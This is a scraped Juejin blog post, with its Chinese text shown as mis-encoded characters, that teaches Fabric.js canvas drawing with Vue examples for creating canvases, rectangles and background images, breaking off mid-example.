itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ¡ˆä¾‹+å›¾è§£å¸¦ä½ é¨æ¸¸ Canvas 2Dç»˜å›¾ Fabric.jsğŸ”¥ğŸ”¥ï¼ˆ5W+å­—ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442981392682829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lsx_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:17:12.000Z" title="Thu Jan 15 2026 09:17:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»24åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"â˜‚"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"âœ“"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"â¤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Fabric.js ç®€ä»‹</h2>
<blockquote>
<p><code>Fabric.js</code> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ä¸”æ“ä½œç®€å•çš„ <code>Javascript HTML5 canvas</code> å·¥å…·åº“ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ed9714af1e54822927b09e08e63d853~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=ZjvpcCjGo7v5Lrdi1RHzEvT%2Fp8w%3D" alt="00.png" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Ffabricjs.com%2F" title="https://link.juejin.cn?target=http%3A%2F%2Ffabricjs.com%2F" target="_blank">ã€Fabric.js å®˜ç½‘é¦–é¡µã€</a></p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Ffabricjs.com%2Fdemos%2F" title="https://link.juejin.cn?target=http%3A%2F%2Ffabricjs.com%2Fdemos%2F" target="_blank">ã€Fabric.js Demosã€</a></p>
<p>æœ¬æ–‡ä¸»è¦è®²è§£ <code>Fabric.js</code> <strong>æœ‰åŸºç¡€ä¹Ÿæœ‰å®æˆ˜</strong>ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>ç”»å¸ƒçš„åŸºæœ¬æ“ä½œ</li>
<li>åŸºç¡€å›¾å½¢ç»˜åˆ¶æ–¹æ³•ï¼ˆçŸ©å½¢ã€åœ†å½¢ã€ä¸‰è§’å½¢ã€æ¤­åœ†ã€å¤šè¾¹å½¢ã€çº¿æ®µç­‰ï¼‰</li>
<li>è‡ªå®šä¹‰å›¾å½¢</li>
<li>å›¾ç‰‡çš„ä½¿ç”¨</li>
<li>æ–‡æœ¬å’Œæ–‡æœ¬æ¡†</li>
<li>å›¾å½¢å’Œæ–‡æœ¬çš„åŸºç¡€æ ·å¼</li>
<li>æ¸å˜</li>
<li>é€‰ä¸­çŠ¶æ€</li>
<li>åˆ†ç»„å’Œå–æ¶ˆåˆ†ç»„</li>
<li>åŠ¨ç”»</li>
<li>è®¾ç½®å’Œè·å–å›¾å½¢å±‚çº§</li>
<li>åŸºç¡€äº‹ä»¶</li>
<li>ç¦æ­¢æ°´å¹³ã€å‚ç›´ç§»åŠ¨</li>
<li>ç¼©æ”¾å’Œå¹³ç§»ç”»å¸ƒ</li>
<li>è§†å£åæ ‡å’Œç”»å¸ƒåæ ‡è½¬æ¢</li>
<li>åºåˆ—åŒ–å’Œååºåˆ—åŒ–</li>
<li>â€¦â€¦</li>
</ul>
<h2 data-id="heading-1">èµ·æ­¥</h2>
<h3 data-id="heading-2">1. æ–°å»ºé¡µé¢å¹¶å¼•å…¥ Fabric.js</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>
</code></pre>
<h3 data-id="heading-3">2. åˆ›å»º canvas å®¹å™¨</h3>
<p>åœ¨ <code>HTML</code> ä¸­åˆ›å»º <code>&lt;canvas&gt;</code>ï¼Œå¹¶è®¾ç½®å®¹å™¨çš„ <code>id</code> å’Œ <code>å®½é«˜ï¼Œwidth/height</code></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"c"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
</code></pre>
<p>è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ª <code>canvas</code> å®¹å™¨ï¼Œè¾¹æ¡†ä¸ºç°è‰²ï¼Œ<strong>id="c"</strong> ã€‚æŒ‡å®šé•¿å®½éƒ½ä¸º <code>400px</code>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04a7df54dfbd4f29be0ce4cc2c28f037~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=eTbb6ID%2BlCpnSycO2bI5C7dTFSE%3D" alt="003.png" loading="lazy"/></p>
<h3 data-id="heading-4">3. ä½¿ç”¨ fabric æ¥ç®¡å®¹å™¨ï¼Œå¹¶ç”»ä¸€ä¸ªçŸ©å½¢</h3>
<p>åœ¨ <code>JS</code> ä¸­å®ä¾‹åŒ– <code>fabric</code> ï¼Œä¹‹åå°±å¯ä»¥ä½¿ç”¨ <code>fabric</code> çš„ <code>api</code> ç®¡ç† <code>canvas</code> äº†ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span> <span class="hljs-comment">// å¼•å…¥ fabric</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'c'</span>) <span class="hljs-comment">// è¿™é‡Œä¼ å…¥çš„æ˜¯canvasçš„id</span>

  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªé•¿æ–¹å½¢</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨é¡¶éƒ¨ 30px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨å·¦ä¾§ 30px</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// å®½ 100px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">60</span>, <span class="hljs-comment">// é«˜ 60px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span> <span class="hljs-comment">// å¡«å…… çº¢è‰²</span>
  })

  <span class="hljs-comment">// åœ¨canvasç”»å¸ƒä¸­åŠ å…¥çŸ©å½¢ï¼ˆrectï¼‰ã€‚</span>
  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1bb2f6f0a9246329f7673fdcbbca3f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=fwPGXqvRwYtkI77G0FHJRjKahAE%3D" alt="004.png" loading="lazy"/></p>
<h2 data-id="heading-5">ç”»å¸ƒ</h2>
<p><code>Fabric.js</code> çš„ç”»å¸ƒæ“ä½œæ€§æ˜¯éå¸¸å¼ºçš„ã€‚</p>
<h3 data-id="heading-6">åŸºç¡€ç‰ˆï¼ˆå¯äº¤äº’ï¼‰</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9050918565bc407f9467853593f13635~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=8cdzf1QrmeID7RpsGFACjH0SxWQ%3D" alt="005.gif" loading="lazy"/></p>
<p>åŸºç¡€ç‰ˆå°±æ˜¯â€œèµ·æ­¥â€ç« èŠ‚æ‰€è¯´çš„é‚£ä¸ªä¾‹å­ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>) <span class="hljs-comment">// è¿™é‡Œä¼ å…¥çš„æ˜¯canvaså…ƒç´ çš„id</span>

  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªé•¿æ–¹å½¢</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨é¡¶éƒ¨ 100px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨å·¦ä¾§ 100px</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// çŸ©å½¢å®½åº¦ 30px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// çŸ©å½¢é«˜åº¦ 30px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span> <span class="hljs-comment">// å¡«å…… çº¢è‰²</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect) <span class="hljs-comment">// å°†çŸ©å½¢æ·»åŠ åˆ° canvas ç”»å¸ƒé‡Œ</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">ä¸å¯äº¤äº’</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34fe710596b64103ab942a542f37f99a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=XlmMmq5k69jOPDhZ6N4CYRb%2FCvY%3D" alt="006.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ä½¿ç”¨ StaticCanvas åˆ›å»ºä¸€ä¸ªä¸å¯æ“ä½œçš„ç”»å¸ƒ</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">StaticCanvas</span>(<span class="hljs-string">'canvas'</span>) <span class="hljs-comment">// è¿™é‡Œä¼ å…¥çš„æ˜¯canvaså…ƒç´ çš„id</span>

  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªé•¿æ–¹å½¢</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨é¡¶éƒ¨ 100px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»å®¹å™¨å·¦ä¾§ 100px</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// çŸ©å½¢å®½åº¦ 30px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// çŸ©å½¢é«˜åº¦ 30px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span> <span class="hljs-comment">// å¡«å…… çº¢è‰²</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>åˆ›å»ºä¸å¯äº¤äº’çš„ç”»å¸ƒï¼Œå…¶å®åªéœ€æŠŠ <code>new fabric.Canvas</code> æ”¹æˆ <code>new fabric.StaticCanvas</code> å³å¯ã€‚</p>
<h3 data-id="heading-8">åœ¨jsè®¾å®šç”»å¸ƒå‚æ•°</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/878f68df0cb44952b80e3edbd44abd93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=PEORSzNcVQMavB1Bu895Sk7KV5Q%3D" alt="007.png" loading="lazy"/></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>, {
    <span class="hljs-attr">width</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">// ç”»å¸ƒå®½åº¦</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">// ç”»å¸ƒé«˜åº¦</span>
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#eee'</span> <span class="hljs-comment">// ç”»å¸ƒèƒŒæ™¯è‰²</span>
})
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-9">ä½¿ç”¨èƒŒæ™¯å›¾</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// è®¾ç½®èƒŒæ™¯å›¾</span>
  <span class="hljs-comment">// å‚æ•°1ï¼šèƒŒæ™¯å›¾èµ„æºï¼ˆå¯ä»¥å¼•å…¥æœ¬åœ°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç½‘ç»œå›¾ï¼‰</span>
  <span class="hljs-comment">// å‚æ•°2ï¼šè®¾ç½®å®ŒèƒŒæ™¯å›¾æ‰§è¡Œä»¥ä¸‹é‡æ–°æ¸²æŸ“canvasçš„æ“ä½œï¼Œè¿™æ ·èƒŒæ™¯å›¾å°±ä¼šå±•ç¤ºå‡ºæ¥äº†</span>
  canvas.<span class="hljs-title function_">setBackgroundImage</span>(
    <span class="hljs-string">'å›¾ç‰‡url'</span>,
    canvas.<span class="hljs-property">renderAll</span>.<span class="hljs-title function_">bind</span>(canvas)
  )
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">æ‹‰ä¼¸èƒŒæ™¯å›¾</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

